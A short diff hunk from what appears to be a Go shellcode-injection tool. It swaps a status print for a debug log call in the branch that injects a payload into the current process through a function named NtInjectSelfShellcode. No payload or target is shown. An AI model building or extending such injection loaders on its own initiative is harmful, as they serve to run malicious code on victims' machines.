@@ -696,7 +696,7 @@ func main() {
 	// Perform the injection based on selected method
 	if useSelfInjection {
 		// Self-injection
-		fmt.Println("Injecting payload into current process (self-injection)")
+		debug.Printfln("MAIN", "Injecting payload into current process (self-injection)\n")
 		err = winapi.NtInjectSelfShellcode(payload)
 		
 		if err != nil {
